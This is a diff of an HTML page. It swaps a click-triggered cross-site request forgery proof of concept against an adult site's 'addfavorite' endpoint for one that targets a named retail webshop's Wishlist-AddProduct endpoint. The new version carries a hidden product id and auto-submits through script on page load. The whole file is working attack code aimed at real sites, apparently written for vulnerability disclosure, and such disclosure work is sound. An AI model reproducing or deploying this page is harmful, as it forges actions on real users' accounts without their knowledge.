@@ -1,9 +1,17 @@
+<!DOCTYPE html>
 <html>
-<body>
-<h3>Click the button to trigger the CSRF request silently.</h3>
-<form action="https://www.mydirtyhobby.com/n/addfavorite/43333271-Costas_Antonis" method="POST">
-<button type="submit">Change List</button>
-</form>
-<p><i>Victim favorite List change.</i></p>
-</body>
+  <head>
+    <title>CSRF PoC</title>
+  </head>
+  <body>
+    <form action="https://www.torfs.be/on/demandware.store/Sites-Torfs-Webshop-BE-Site/nl_BE/Wishlist-AddProduct"
+          method="POST">
+      <input type="hidden" name="pid" value="358612">
+      <input type="submit" value="Submit CSRF">
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
